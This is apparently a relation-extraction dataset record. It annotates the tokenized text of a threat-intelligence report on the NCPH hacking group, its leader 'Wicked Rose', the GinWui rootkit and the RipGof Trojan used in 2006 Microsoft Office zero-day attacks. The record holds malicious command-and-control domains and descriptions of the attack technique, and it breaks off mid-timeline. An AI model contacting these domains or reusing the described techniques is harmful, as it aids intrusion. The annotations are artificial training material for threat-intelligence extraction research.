["8caf2a96e4d7bb83156c260ccc8f47e7"], ["a4ff66224a0967763e1d079c99482577"], ["f0b93bf7273cbeaed69ed55b5169daf7"], ["3be6fea2bf35c3c3be860622c68ff369"], ["5fa26f410d0133f4152ea78df3978c22"], ["3d10e68dec16b1a4bf949e3e403f2dda"], ["5c371a6dfb45f188fe8e6da4fee9300d"], ["9ff3a9ef192453ecec26cf567c579bff"], ["65445b138d80954cc912a6e43fe5b66d"], ["685805936d8744225f8c11965202de8e"], ["80e978d0eea713812f1dd6b4e9b7daf2"], ["921c724ccb04b9f672b294ffff83ce7b"], ["072877b961e31e8792a296c63b9c7b56"], ["1a8bc862ceaa7e05189345065145842a"], ["6794cc6f5e463ee7432b9e718d8c1b8e"], ["fdb949112cc72c68fc7c1ea0c65344bc"], ["f4a6114fce22eb18b0ccf19cfa68ddba"], ["1045e26819ff782015202838e2c609f7"], ["5640beb540bef2e97ec4366713d533b8"], ["0f93d28964b440c241ca126a7f94dae2"], ["075df4723073ff08cd3e90d2b1f11722"], ["240627a306f32483378e44ff13e12169"], ["5f2a4d865e6e94f7f15571faab5128d6"], ["3bfa7b806ff540cc1c264ec75048fbc4"], ["05a02e08cce99d3821574d8612f757fd"], ["d60cfe03bce8647cce723991e2cd2f8c"], ["6ed270da7450945a3a5a05eda8312732"], ["a1083968b78c081135268b6e4e12b1e5"], ["0fce05e2cea6bd9c217373f2ab962d82"], ["85ef19fab3951d4dd56e42b5a9ccdeea"], ["422f1ffe7e5bda7062f005be92fba36e"], ["346aa61b5739e616482a1bc8bb548871"], ["c2661e45ec2198b04b29ec3fd1e120b2"], ["e04e5eb4aefeb326246d7f41d1b50759"], ["eb1aa241b4a482ac44b27ce38eabccb7"], ["418fb9ba2a61bccab3e54ebe0698c4b6"], ["590e68aaaa5c2353b7288f64cc87d9bb"], ["1f9894e730c0f5ba085baae409aa963a"], ["11b76423f450ba610f073e7522eeb56b"], ["54d37fb1f624c798f0b400b4f50f3635"], ["7fda0451e4d320cc34efcaaabedd6824"], ["84fc624f9f5f8de6980497058db1e8e1"], ["964eec615f977b05bc87943ce0942cf9"], ["5069057b799636c012eec38147fb96e6"], ["a4a1670c537861f7d5b0db115a7aa5fa"], ["00b9619613bc82f5fe117c2ca394a328"], ["2219bef789ff73efc0a01f87be03188d"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Exploit", "name": "Zero-day", "sent_id": 2, "pos": [0]}, {"old_id": "T2", "type": "Organization", "name": "VeriSign iDefense", "sent_id": 6, "pos": [2, 3]}, {"old_id": "T3", "type": "AttackerGroup", "name": "NCPH", "sent_id": 7, "pos": [16]}, {"old_id": "T4", "type": "Time", "name": "2006", "sent_id": 8, "pos": [15]}, {"old_id": "T5", "type": "Attacker", "name": "Wicked Rose", "sent_id": 7, "pos": [9, 10]}, {"old_id": "T6", "type": "Attacker", "name": "KuNgBiM", "sent_id": 18, "pos": [0]}, {"old_id": "T7", "type": "Attacker", "name": "Rodag", "sent_id": 19, "pos": [0]}, {"old_id": "T8", "type": "Attacker", "name": "Charles", "sent_id": 20, "pos": [0]}, {"old_id": "T9", "type": "Vulnerability", "name": "Microsoft Word Malformed OLE Structure Code Execution", "sent_id": 27, "pos": [1, 7]}, {"old_id": "T10", "type": "Vulnerability", "name": "Microsoft Excel Malformed BIFF Structure Code Execution", "sent_id": 27, "pos": [1, 7]}, {"old_id": "T11", "type": "Organization", "name": "Internet Storm Center", "sent_id": 31, "pos": []}, {"old_id": "T12", "type": "Organization", "name": "SANS", "sent_id": 32, "pos": [13]}, {"old_id": "T13", "type": "Organization", "name": "iDefense", "sent_id": 32, "pos": [9]}, {"old_id": "T14", "type": "MalwareFamily", "name": "GinWui", "sent_id": 35, "pos": [3]}, {"old_id": "T15", "type": "Software", "name": "Microsoft Word 2002", "sent_id": 41, "pos": [6, 8]}, {"old_id": "T16", "type": "Time", "name": "May 12 2006", "sent_id": 42, "pos": [3, 6]}, {"old_id": "T17", "type": "Attacker", "name": "Wicked Rose", "sent_id": 46, "pos": []}, {"old_id": "T18", "type": "Country", "name": "United States", "sent_id": 43, "pos": [11, 12]}, {"old_id": "T19", "type": "Country", "name": "Japan", "sent_id": 44, "pos": [2]}, {"old_id": "T20", "type": "Malware", "name": "GinWuiA", "sent_id": 45, "pos": []}, {"old_id": "T21", "type": "Malware", "name": "GinWuiB", "sent_id": 45, "pos": []}, {"old_id": "T22", "type": "Indicator", "name": "neasenet", "sent_id": 53, "pos": []}, {"old_id": "T23", "type": "File", "name": "Planning document 5-16-2006doc", "sent_id": 62, "pos": []}, {"old_id": "T24", "type": "Time", "name": "May 17 2006", "sent_id": 65, "pos": [5, 8]}, {"old_id": "T25", "type": "Payload", "name": "GinWui", "sent_id": 69, "pos": [1]}, {"old_id": "T26", "type": "TrojanHorse", "name": "GinWui", "sent_id": 70, "pos": [11]}, {"old_id": "T27", "type": "TrojanHorse", "name": "winguisdll", "sent_id": 71, "pos": []}, {"old_id": "T28", "type": "Attacker", "name": "Wicked Rose", "sent_id": 75, "pos": [0, 1]}, {"old_id": "T29", "type": "Malware", "name": "GinWui", "sent_id": 75, "pos": [7]}, {"old_id": "T30", "type": "Organization", "name": "WHG", "sent_id": 77, "pos": [2]}, {"old_id": "T31", "type": "Time", "name": "June 21 2006", "sent_id": 89, "pos": [3, 6]}, {"old_id": "T32", "type": "Attacker", "name": "Wicked Rose", "sent_id": 84, "pos": [6, 7]}, {"old_id": "T33", "type": "Attacker", "name": "RipGof", "sent_id": 95, "pos": [0]}, {"old_id": "T34", "type": "Time", "name": "June 2006", "sent_id": 98, "pos": [1, 2]}, {"old_id": "T35", "type": "TrojanHorse", "name": "RipGofB", "sent_id": 99, "pos": []}, {"old_id": "T36", "type": "Vulnerability", "name": "MS06-027", "sent_id": 99, "pos": [8]}, {"old_id": "T37", "type": "TrojanHorse", "name": "RipGofB", "sent_id": 99, "pos": []}, {"old_id": "T38", "type": "Indicator", "name": "enjoyirdetcom", "sent_id": 107, "pos": []}, {"old_id": "T39", "type": "Indicator", "name": "enjoybmwseecom", "sent_id": 107, "pos": []}, {"old_id": "T40", "type": "TrojanHorse", "name": "RipGofB", "sent_id": 107, "pos": []}, {"old_id": "T41", "type": "TrojanHorse", "name": "RipGofA", "sent_id": 111, "pos": []}, {"old_id": "T42", "type": "ExploitTargetObject", "name": "Jet Engine Database", "sent_id": 112, "pos": [15, 17]}, {"old_id": "T43", "type": "TrojanHorse", "name": "RipGofA", "sent_id": 112, "pos": []}, {"old_id": "T44", "type": "Time", "name": "March 2005", "sent_id": 113, "pos": [0, 1]}, {"old_id": "T45", "type": "Attacker", "name": "RipGof", "sent_id": 113, "pos": [12]}, {"old_id": "T46", "type": "Attacker", "name": "Evil Security Team", "sent_id": 126, "pos": []}, {"old_id": "T47", "type": "GeneralVirus", "name": "Dasher", "sent_id": 127, "pos": [10]}, {"old_id": "T48", "type": "TrojanHorse", "name": "PcShares", "sent_id": 127, "pos": [15]}, {"old_id": "T49", "type": "Time", "name": "April 22 2005", "sent_id": 133, "pos": [0, 3]}, {"old_id": "T50", "type": "Time", "name": "Dec 19 2005", "sent_id": 134, "pos": [0, 4]}, {"old_id": "T51", "type": "Time", "name": "April 27 2006", "sent_id": 135, "pos": [0, 3]}, {"old_id": "T52", "type": "Time", "name": "April 30 2006", "sent_id": 136, "pos": [0, 3]}, {"old_id": "T53", "type": "Time", "name": "May 2 2006", "sent_id": 137, "pos": [0, 3]}, {"old_id": "T54", "type": "Time", "name": "May 12 2006", "sent_id": 138, "pos": [0, 3]}, {"old_id": "T55", "type": "Time", "name": "May 15 2006", "sent_id": 139, "pos": [0, 3]}, {"old_id": "T56", "type": "Time", "name": "May 16 2006", "sent_id": 140, "pos": [0, 3]}, {"old_id": "T57", "type": "Time", "name": "May 16 2006", "sent_id": 141, "pos": [0, 3]}, {"old_id": "T58", "type": "Time", "name": "May 18 2006", "sent_id": 142, "pos": [0, 3]}, {"old_id": "T59", "type": "Time", "name": "May 19 2006", "sent_id": 143, "pos": [0, 3]}, {"old_id": "T60", "type": "Time", "name": "May 20 2006", "sent_id": 144, "pos": [0, 3]}, {"old_id": "T61", "type": "Time", "name": "May 20 2006", "sent_id": 145, "pos": [0, 3]}, {"old_id": "T62", "type": "Time", "name": "May 29 2006", "sent_id": 146, "pos": [0, 3]}, {"old_id": "T63", "type": "Time", "name": "June 1 2006", "sent_id": 147, "pos": [0, 3]}, {"old_id": "T64", "type": "Time", "name": "June 9 2006", "sent_id": 148, "pos": [0, 3]}, {"old_id": "T65", "type": "Time", "name": "June 14 2006", "sent_id": 149, "pos": [0, 3]}, {"old_id": "T66", "type": "Time", "name": "June 15 2006", "sent_id": 150, "pos": [0, 3]}, {"old_id": "T67", "type": "Time", "name": "June 15 2006", "sent_id": 151, "pos": [0, 3]}, {"old_id": "T68", "type": "Time", "name": "June 16 2006", "sent_id": 152, "pos": [0, 3]}, {"old_id": "T69", "type": "Time", "name": "June 18 2006", "sent_id": 153, "pos": [0, 3]}, {"old_id": "T70", "type": "Time", "name": "June 23 2006", "sent_id": 154, "pos": [0, 3]}, {"old_id": "T71", "type": "Time", "name": "June 23 2006", "sent_id": 155, "pos": [0, 3]}, {"old_id": "T72", "type": "Time", "name": "June 25 2006", "sent_id": 156, "pos": [0, 3]}, {"old_id": "T73", "type": "Time", "name": "June 26 2006", "sent_id": 157, "pos": [0, 3]}, {"old_id": "T74", "type": "Time", "name": "Sept 27 2006", "sent_id": 158, "pos": [0, 4]}, {"old_id": "T75", "type": "Time", "name": "Sept 30 2006", "sent_id": 159, "pos": [0, 4]}, {"old_id": "T76", "type": "Time", "name": "Oct 9 2006", "sent_id": 160, "pos": [0, 4]}, {"old_id": "T77", "type": "Time", "name": "September 7", "sent_id": 160, "pos": []}, {"old_id": "T78", "type": "Malware", "name": "RipGofA", "sent_id": 133, "pos": []}, {"old_id": "T79", "type": "GeneralVirus", "name": "Dasher", "sent_id": 134, "pos": [6]}, {"old_id": "T80", "type": "TrojanHorse", "name": "PcShare", "sent_id": 134, "pos": [9]}, {"old_id": "T81", "type": "Attacker", "name": "Evil Security Team", "sent_id": 134, "pos": [13, 15]}, {"old_id": "T82", "type": "TrojanHorse", "name": "GinWuiA", "sent_id": 138, "pos": []}, {"old_id": "T83", "type": "TrojanHorse", "name": "GinWuiA", "sent_id": 141, "pos": []}, {"old_id": "T84", "type": "TrojanHorse", "name": "GinWuiB", "sent_id": 144, "pos": []}, {"old_id": "T85", "type": "TrojanHorse", "name": "GinWuiC", "sent_id": 146, "pos": []}, {"old_id": "T86", "type": "Dropper", "name": "MdropperF", "sent_id": 148, "pos": []}, {"old_id": "T87", "type": "Malware", "name": "DaserfA", "sent_id": 149, "pos": []}, {"old_id": "T88", "type": "Dropper", "name": "MdropperG", "sent_id": 150, "pos": []}, {"old_id": "T89", "type": "TrojanHorse", "name": "BooliA Trojan", "sent_id": 151, "pos": []}, {"old_id": "T90", "type": "Malware", "name": "FluxE", "sent_id": 152, "pos": []}, {"old_id": "T91", "type": "Malware", "name": "RipGofB", "sent_id": 153, "pos": []}, {"old_id": "T92", "type": "Dropper", "name": "PPDropperA", "sent_id": 154, "pos": []}, {"old_id": "T93", "type": "TrojanHorse", "name": "BooliB Trojan", "sent_id": 155, "pos": []}, {"old_id": "T94", "type": "Malware", "name": "GinWuiD", "sent_id": 156, "pos": []}, {"old_id": "T95", "type": "Malware", "name": "GinWuiE", "sent_id": 157, "pos": []}, {"old_id": "T96", "type": "Dropper", "name": "PPDropperF", "sent_id": 158, "pos": []}, {"old_id": "T97", "type": "Malware", "name": "GinWuiG", "sent_id": 159, "pos": []}, {"old_id": "T98", "type": "Attacker", "name": "MeiGui HeiKe", "sent_id": 169, "pos": []}, {"old_id": "T99", "type": "Indicator", "name": "wwwmghackercom", "sent_id": 170, "pos": []}, {"old_id": "T100", "type": "Attacker", "name": "WHG", "sent_id": 213, "pos": [0]}, {"old_id": "T101", "type": "MalwareFamily", "name": "GinWui", "sent_id": 214, "pos": [9]}, {"old_id": "T102", "type": "Email", "name": "ncph2005@126com", "sent_id": 185, "pos": []}, {"old_id": "T103", "type": "Location", "name": "Zigong Sichuan Province", "sent_id": 187, "pos": [9, 12]}, {"old_id": "T104", "type": "Country", "name": "China", "sent_id": 187, "pos": [16]}, {"old_id": "T105", "type": "Email", "name": "whg@163com", "sent_id": 227, "pos": []}, {"old_id": "T106", "type": "Attacker", "name": "WZT", "sent_id": 233, "pos": [0]}, {"old_id": "T107", "type": "AttackerGroup", "name": "NCPH", "sent_id": 233, "pos": [7]}, {"old_id": "T108", "type": "AttackerGroup", "name": "NCPH", "sent_id": 213, "pos": [7]}, {"old_id": "T109", "type": "Indicator", "name": "tthackercublogcn", "sent_id": 240, "pos": []}, {"old_id": "T110", "type": "Indicator", "name": "windowsupdatesnet", "sent_id": 243, "pos": []}, {"old_id": "T111", "type": "Location", "name": "Jiangsu", "sent_id": 245, "pos": [7]}, {"old_id": "T112", "type": "Location", "name": "Sichuan", "sent_id": 245, "pos": [10]}, {"old_id": "T113", "type": "Organization", "name": "WHOIS", "sent_id": 242, "pos": [0]}], "labels": [{"old_id": "R1", "r": "P3", "h": 4, "t": 2, "evidence": [7]}, {"old_id": "R2", "r": "P33", "h": 4, "t": 3, "evidence": [7, 8]}, {"old_id": "R3", "r": "P33", "h": 16, "t": 15, "evidence": []}, {"old_id": "R4", "r": "P14", "h": 19, "t": 13, "evidence": []}, {"old_id": "R5", "r": "P14", "h": 20, "t": 13, "evidence": []}, {"old_id": "R6", "r": "P2", "h": 27, "t": 28, "evidence": [75]}, {"old_id": "R7", "r": "P33", "h": 31, "t": 30, "evidence": [84, 85, 86, 87, 88, 89]}, {"old_id": "R8", "r": "P23", "h": 27, "t": 26, "evidence": []}, {"old_id": "R9", "r": "P23", "h": 27, "t": 25, "evidence": []}, {"old_id": "R10", "r": "P33", "h": 32, "t": 33, "evidence": [95, 96, 97, 98]}, {"old_id": "R11", "r": "P2", "h": 32, "t": 34, "evidence": [95, 96, 97, 98, 99]}, {"old_id": "R12", "r": "P21", "h": 37, "t": 39, "evidence": [107]}, {"old_id": "R13", "r": "P21", "h": 38, "t": 39, "evidence": [107]}, {"old_id": "R14", "r": "P33", "h": 44, "t": 43, "evidence": [113]}, {"old_id": "R15", "r": "P23", "h": 45, "t": 46, "evidence": [126, 127]}, {"old_id": "R16", "r": "P23", "h": 45, "t": 47, "evidence": [126, 127]}, {"old_id": "R17", "r": "P33", "h": 77, "t": 48, "evidence": [133]}, {"old_id": "R18", "r": "P33", "h": 78, "t": 49, "evidence": [134]}, {"old_id": "R19", "r": "P33", "h": 79, "t": 49, "evidence": [134]}, {"old_id": "R20", "r": "P33", "h": 80, "t": 49, "evidence": [134]}, {"old_id": "R21", "r": "P23", "h": 80, "t": 78, "evidence": [134]}, {"old_id": "R22", "r": "P23", "h": 80, "t": 79, "evidence": [134]}, {"old_id": "R23", "r": "P33", "h": 81, "t": 53, "evidence": [138]}, {"old_id": "R24", "r": "P33", "h": 82, "t": 56, "evidence": [141]}, {"old_id": "R25", "r": "P33", "h": 83, "t": 59, "evidence": [144]}, {"old_id": "R26", "r": "P33", "h": 84, "t": 61, "evidence": [146]}, {"old_id": "R27", "r": "P33", "h": 85, "t": 63, "evidence": [148]}, {"old_id": "R28", "r": "P33", "h": 86, "t": 64, "evidence": [149]}, {"old_id": "R29", "r": "P33", "h": 87, "t": 65, "evidence": [150]}, {"old_id": "R30", "r": "P33", "h": 88, "t": 66, "evidence": [151]}, {"old_id": "R31", "r": "P33", "h": 89, "t": 67, "evidence": [152]}, {"old_id": "R32", "r": "P33", "h": 90, "t": 68, "evidence": [153]}, {"old_id": "R33", "r": "P33", "h": 91, "t": 69, "evidence": [154]}, {"old_id": "R34", "r": "P33", "h": 92, "t": 70, "evidence": [155]}, {"old_id": "R35", "r": "P33", "h": 93, "t": 71, "evidence": [156]}, {"old_id": "R36", "r": "P33", "h": 94, "t": 72, "evidence": [157]}, {"old_id": "R37", "r": "P33", "h": 95, "t": 73, "evidence": [158]}, {"old_id": "R38", "r": "P33", "h": 96, "t": 74, "evidence": [159]}, {"old_id": "R39", "r": "P3", "h": 105, "t": 106, "evidence": [233]}, {"old_id": "R40", "r": "P3", "h": 99, "t": 107, "evidence": [213]}], "title": ["inputs/txt/201211DunhamWickedRose"], "sents": [["\"Wicked", "Rose\"", "and", "the", "NCPH", "Hacking", "Group"], ["by", "Ken", "Dunham", "&", "Jim", "Melnick"], ["Zero-day", "attacks", ",", "where", "an", "attack", "occurs", "before", "public", "knowledge", "of", "a", "vulnerability", "is", "known", ",", "is"], ["a", "growing", "cause", "of", "concern", "for", "security", "professionals", "in", "the", "21st", "century", ".", "An", "unprecedented"], ["number", "of", "zero-day", "attacks", "took", "place", "in", "2006", ",", "largely", "involving", "Microsoft", "Office", "Files", ".", "Ken"], ["Dunham", ",", "Director", "of", "the", "Rapid", "Response", "Team", ",", "and", "Jim", "Melnick", ",", "Director", "of", "Threat", "Operations", ","], ["led", "the", "VeriSign", "iDefense", "intelligence", "team", "to", "track", "down", "Chinese", "hackers", "for", "hire", "out", "of", "China", ","], ["responsible", "for", "many", "of", "the", "attacks", "in", "2006", ".", "Wicked", "Rose", "is", "the", "ring-leader", "of", "the", "NCPH"], ["hacking", "group", "and", "this", "is", "the", "story", "of", "their", "maturation", "into", "significant", "global", "threat", "by", "2006", "."], ["1"], ["Introduction", "to", "N", ".", "C.P.H."], ["N", ".", "C.P.H.", "(Network", "Crack", "Program", "Hacker)", "has", "about", "ten", "members", "or", "associates", ".", "Four", "core"], ["members", "exist", "as", "of", "2006:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["(Wicked)", "Rose"], ["KuNgBiM"], ["Rodag"], ["Charles"], ["There", "are", "also", "some", "six", "other", "associates", "within", "NCPH", "and", "two", "other", "positions", "(possibly", "unfilled"], ["positions)", "whose", "purpose", "is", "unclear", ".", "However", ",", "\u201cRose\u201d", "or", "\u201cWicked", "Rose\u201d", "seems", "to", "be", "the"], ["primary", "leader", ".", "Membership", "rules", ",", "recruiting", "goals", "and", "standards", "are", "unknown", ".", "However", ",", "some"], ["members", "appear", "to", "be", "current", "or", "former", "students", "of", "Sichuan", "University", "of", "Science", "and"], ["Engineering", ".", "1"], ["The", "group", "is", "responsible", "for", "development", "and", "deployment", "of", "exploit", "codes", "related", "vulnerabilities"], ["in", "Microsoft", "Word", "Malformed", "OLE", "Structure", "Code", "Execution", "and", "Microsoft", "Excel", "Malformed"], ["BIFF", "Structure", "Code", "Execution", "."], ["2"], ["Public", "Knowledge", "of", "a", "Zero-Day", "Word", "Exploit"], ["The", "story", "of", "NCPH", "zero-day", "attacks", "begins", "publicly", "on", "May", "18", ",", "2006", ".", "On", "this", "day", "the", "Internet"], ["Storm", "Center", "reports", "a", "new", "possible", "zero-day", "attack", ".", "iDefense", "worked", "closely", "with", "SANS", "and"], ["other", "organizations", "to", "analyze", "the", "threat", "landscape", "as", "it", "related", "to", "exploitation", "of", "this"], ["vulnerability", ".", "Within", "the", "next", "36", "hours", ",", "iDefense", "gained", "access", "to", "multiple", "codes", "and", "extracted", "a"], ["new", "rootkit", "called", "GinWui", ".", "Independent", "research", "proved", "the", "following:"], ["\uf0b7"], ["\uf0b7"], ["\uf0b7"], ["1"], ["Exploitation", "targeted", "a", "new", "vulnerability", "that", "allowed", "attackers", "to", "successfully", "exploit"], ["computers", "running", "fully", "patched", "versions", "of", "Microsoft", "Word", "2002", "and", "others", "."], ["Exploitation", "dated", "to", "May", "12", ",", "2006", "and", "involved", "at", "least", "six", "unique", "hostile", "exploit", "files", "."], ["iDefense", "confirmed", "that", "attacks", "targeted", "two", "organizations", ",", "one", "in", "the", "United", "States", "and"], ["one", "in", "Japan", "."], ["Chinese-authored", "rootkits", "GinWui", ".", "A", "and", "GinWui", ".", "B", "exist", "in", "several", "attacks", ".", "iDefense"], ["identified", "the", "rootkits'", "source", "and", "authors", "as", "Chinese", "actor", "\"Wicked", "Rose\"", "and", "others"], ["profiled", "later", "in", "this", "report", "."], ["www", ".", "suse.edu.cn", "&", "http://www", ".", "study-in-china.org/school/Sichuan/suse/"], ["\uf0b7"], ["\uf0b7"], ["Successful", "installation", "of", "the", "rootkit", "requires", "Administrator", "or", "Debugger", "rights", ".", "Initial"], ["exploitation", ",", "however", ",", "does", "not", "require", "Administrator", "rights", "."], ["iDefense", "identified", "unique", "malicious", "code", "attacks", "pointing", "to", "nease", ".", "net", "and", "authored"], ["several", "Snort", "signatures", "for", "this", "traffic", ".", "iDefense", "continues", "to", "monitor", "other", "domains"], ["related", "to", "the", "attack", "."], ["The", "original", "attack", "upon", "a", "large", "DoD", "entity", "within", "the", "USA", "began", "on", "May", "12", ",", "2006", ".", "Targets", "of"], ["the", "attacker", "were", "apparently", "\"Googled\"", "by", "the", "attacker", ".", "Three", "variations", "of", "a", "Microsoft", "Word"], ["zero-day", "attack", "are", "involved", "in", "the", "attack", ".", "A", "few", "dozen", "attack", "files", "are", "first", "distributed", "to", "less"], ["than", "a", "dozen", "targets", "to", "identify", "which", "version", "works", "within", "the", "organization", "."], ["Once", "attackers", "identify", "the", "vulnerable", "version", "of", "Microsoft", "Word", "used", "within", "the", "organization"], ["close", "to", "200", "messages", "sent", "out", "to", "multiple", "targets", "within", "the", "organization", "within", "24", "hours", ".", "This"], ["second", "wave", "of", "attack", "is", "distributed", "as", "\"Planning", "document", "5-16-2006", ".", "doc\".", "This", "code", "is"], ["improved", "beyond", "the", "first", "variant", "sent", "out", "earlier", "to", "identify", "the", "vulnerable", "version", "of", "Word"], ["within", "the", "targeted", "network", "."], ["A", "third", "attack", "commences", "on", "May", "17", ",", "2006", ".", "During", "this", "period", ",", "the", "Internet", "Storm", "Center", "and"], ["others", "get", "involved", "and", "the", "case", "becomes", "public", ".", "In", "the", "end", ",", "iDefense", "identified", "six", "unique"], ["samples", ",", "of", "which", "three", "are", "more", "prevalent", "than", "other", "variants", "."], ["3"], ["The", "GinWui", "Backdoor", "Rootkit", "Payload"], ["Zero", "day", "attacks", "commenced", "in", "May", "2006", "attempted", "to", "install", "a", "GinWui", "backdoor", "Trojan", "horse"], ["and", "Windows", "rootkit", ".", "A", "DLL", "file", "called", "winguis", ".", "dll", "and", "several", "SYS", "files", "install", "themselves"], ["when", "a", "computer", "is", "successfully", "attacked", "through", "an", "exploit", ".", "Two", "versions", "of", "the", "GinWui"], ["rootkit", "are", "installed", "during", "several", "attacks", "in", "May", "and", "June", "2006", "."], ["NCHP", "5", ".", "0", "Screenshot", "(GinWui", "Rootkit)"], ["Wicked", "Rose", "is", "the", "author", "of", "the", "GinWui", "malicious", "code", ".", "His", "code", "and", "support", "posts", "related", "to"], ["GinWui", "distributions", "exist", "on", "the", "Chinese", "NCPH", "and", "Evil", "Octal", "forums", ".", "Wicked", "Rose"], ["associates", "with", "WHG", "and", "others", "on", "this", "form", ".", "WHT", "hosted", "version", "\"3", ".", "0beta.3\"", "of", "the", "\"NCPH"], ["remote", "control\"", "rootkit", "code", "on", "May", "2", ",", "2006", ".", "This", "distribution", "of", "GinWui", "was", "largely", "unknown"], ["and", "undetected", "by", "anti-virus", "companies", "at", "the", "time", "of", "release", "."], ["Versions", "of", "GinWui", "used", "in", "targeted", "attacks", "of", "May", "and", "June", "2006", "are", "private", "versions", ",", "not"], ["released", "to", "the", "public", ".", "This", "proves", "that", "Wicked", "Rose", "either", "constructed", "the", "zero", "day", "attacks", "or"], ["sold", "private", "code", "to", "users", "that", "performed", "the", "attack", "."], ["Wicked", "Rose", "later", "documents", "additional", "updates", "to", "his", "rootkit", "code", ",", "version", "", ".", "50,", "at"], ["http://rodag", ".", "blogbus.com/index.html.", "By", "this", "time", "Wicked", "Rose", "was", "performing", "full-time"], ["development", "of", "this", "malicious", "code", "as", "a", "hacker", "for", "hire", "."], ["4"], ["June", "21", ",", "2007", "\u2013", "Continued", "US", "Targeted", "Attacks"], ["Just", "over", "a", "month", "later", ",", "following", "initial", "GinWui", "based", "targeted", "attacks", ",", "another", "Microsoft", "Word"], ["exploit", "occurs", "on", "June", "21", ",", "2006", ".", "A", "spoofed", "e-mail", "is", "sent", "to", "a", "target", "containing", "a", "hostile"], ["Microsoft", "Word", "document", ".", "Analysis", "of", "the", "attack", "reveals", "that", "it's", "likely", "a", "test", "file", "used", "to"], ["identify", "what", "version", "of", "Word", "may", "be", "running", "within", "the", "targeted", "organization", ",", "rather", "than", "a"], ["refined", "targeted", "attack", "upon", "a", "known", "version", "of", "Microsoft", "Word", ".", "Chinese", "text", "within", "the", "Word"], ["document", "reveal", "Chinese", "characters", "discussing", "a", "systematic", "evaluation", "of", "offsets", "for", "Microsoft"], ["Word", "exploitation:"], ["RipGof", "attacks", "reveal", "a", "Chinese", "string", "related", "to", "systematic", "testing", "of", "offsets", "for", "exploitation", "."], ["5"], ["Backtracking", "Targeted", "Attacks:", "RipGof"], ["In", "June", "2006", "another", "targeted", "attack", "emerges", ",", "but", "it's", "not", "GinWui", "this", "time", "but", "a", "new", "code", ","], ["RipGof", ".", "B.", "The", "attack", "attempts", "to", "exploit", "MS06-027", "to", "install", "RipGof", ".", "B,", "a", "Trojan", "horse", ".", "This", "is"], ["the", "same", "exploit", "code", "used", "in", "the", "former", "Zero-Day", "attacks", "linked", "to", "Wicked", "Rose", "and", "the", "NCPH"], ["hacking", "group", ".", "The", "exploit", "code", "is", "still", "private", "at", "this", "time", ",", "proving", "that", "the", "author", "of", "both"], ["GinWui", "and", "RipGof", "attacks", "are", "the", "same", "individual", "or", "group", "or", "affiliated", "through", "underground"], ["criminal", "operations", "."], ["RipGof", ".", "B", "is", "an", "improvement", "of", "the", "former", "exploit", "used", "in", "GinWui", "attacks", ".", "RipGof", ".", "B", "attacks"], ["included", "improvements", "to", "shellcode", "that", "attempts", "to", "fork", "to", "different", "locations", "based", "upon", "the"], ["address", "value", "of", "the", "stack", "to", "exploit", "multiple", "versions", "of", "Microsoft", "Word", ".", "Once", "installed", ","], ["RipGof", ".", "B", "attempts", "to", "connect", "to", "enjoy", ".", "irdet.com", "and", "enjoy", ".", "bmwsee.com", "over", "TCP", "port", "80", ".", "It"], ["runs", "as", "a", "rootkit", "and", "backdoor", "Trojan", "horse", "and", "phones", "home", "to", "a", "Chinese", "server", "with", "stolen"], ["data", "."], ["RipGof", "malicious", "code", "does", "not", "exist", "as", "a", "distribution", "in", "the", "underground", ",", "leading", "investigators"], ["to", "look", "into", "the", "original", "RipGof", ".", "A", "malicious", "code", ".", "Over", "a", "year", "prior", "to", "the", "2006", "targeted", "attacks"], ["RipGof", ".", "A", "emerges", "in", "the", "wild", ".", "RipGof", ".", "A", "attempted", "to", "exploit", "the", "Jet", "Engine", "Database", "exploit", "in"], ["March", "2005", ".", "This", "proves", "attempted", "exploitation", "and", "installation", "of", "code", "through", "RipGof", "for", "a"], ["year", "prior", "to", "more", "sophisticated", "codes", "and", "attacks", "."], ["In", "summary", ",", "RipGof", "and", "GinWui", "attacks", "both", "use", "the", "same", "private", "exploit", "code", "against"], ["Microsoft", "Word", "and", "both", "install", "rootkit", "based", "codes", "to", "steal", "and", "send", "information", "back", "to"], ["Chinese", "sources", ".", "This", "circumstantial", "evidence", "reveals", "that", "Wicked", "Rose", "and", "the", "NCPH", "group"], ["likely", "began", "their", "exploitation", "efforts", "at", "least", "a", "year", "and", "a", "half", "to", "two", "years", "prior", "to", "sophisticated"], ["attacks", "that", "commenced", "in", "2006", ".", "Once", "the", "group", "found", "a", "vulnerability", "within", "Microsoft", "Word"], ["they", "were", "able", "to", "improve", "upon", "it", "and", "their", "targeted", "attack", "techniques", "to", "distribute", "multiple"], ["targeted", "attacks", "and", "malicious", "codes", "for", "criminal", "gain", "as", "hackers", "for", "hire", "."], ["6"], ["Timeline", "of", "Events"], ["Wicked", "Rose", "and", "the", "NCPH", "hacking", "group", "are", "implicated", "in", "multiple", "Office", "based", "attacks", "over"], ["a", "two", "year", "period", ".", "An", "attack", "in", "2006", "used", "RipGof", ".", "B", "in", "the", "attack", ".", "RipGof", ".", "A", "first", "emerged", "a"], ["year", "earlier", "using", "an", "exploit", "that", "is", "relatively", "unsophisticated", ".", "Over", "the", "next", "year", "the", "Evil"], ["Security", "Team", ",", "also", "out", "of", "China", ",", "creates", "the", "Dasher", "worm", "and", "uses", "the", "PcShares", "Trojan", "in", "an"], ["attack", ".", "Wicked", "Rose", "gives", "a", "recommendation", "on", "the", "Trojan", "the", "day", "it", "is", "updated", "in", "the", "spring", "of"], ["2006", ",", "showing", "a", "close", "affiliation", "between", "Wicked", "Rose", "and", "the", "Evil", "Security", "Team", "actors", "."], ["Multiple", "attacks", "that", "take", "place", "in", "May", "and", "June", "and", "later", "2006", "are", "related", "to", "privately", "held"], ["exploit", "code", "for", "both", "Microsoft", "Word", "and", "Excel", ",", "proven", "to", "be", "developed", "by", "Wicked", "Rose", ".", "A"], ["timeline", "of", "proven", "associated", "events", "related", "to", "Wicked", "Rose", "attacks", "is", "below:"], ["April", "22", ",", "2005", "-", "RipGof", ".", "A", "JetEngine", "DB", "Attack"], ["Dec", ".", "19", ",", "2005", "\u2013", "Dasher", "worm", "and", "PcShare", "Trojan", "attack", "by", "Evil", "Security", "Team"], ["April", "27", ",", "2006", "Update", "to", "windowsupdates", ".", "net", "attack", "site"], ["April", "30", ",", "2006", "-", "Wicked", "Rose", "Drops", "out", "of", "School"], ["May", "2", ",", "2006", "\u2013", "3", ".", "0beta3", "NCPH", "remote", "control", "(GinWui)", "public", "release"], ["May", "12", ",", "2006", "-", "Initial", "probing", "and", "GinWui", ".", "A", "exploitation", "attempts", "against", "US", "target"], ["May", "15", ",", 